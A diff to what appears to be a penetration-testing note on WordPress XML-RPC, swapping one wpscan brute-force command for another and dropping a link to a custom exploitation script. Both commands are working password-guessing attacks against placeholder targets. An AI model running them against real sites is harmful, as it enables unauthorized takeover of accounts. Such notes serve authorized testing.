@@ -53,9 +53,6 @@ If the response contains valid blog information, the credentials are correct. Au
 WPScan simplifies brute force attacks and XML-RPC vulnerability scans.
 
 ```bash
-wpscan --url http://<target_ip>/ --enumerate u,vp,t --random-agent --passwords /path/to/passwords.txt --usernames /path/to/usernames.txt
+wpscan --password-attack xmlrpc --url <url> -U <user> -P <wordlist> -t 20
 ```
 
-#### Using Custom Scripts
-
-For fine-grained control, use custom scripts like [kill-xmlrpc](https://github.com/R-kill-9/kill-xmlrpc) to automate brute force or exploitation.
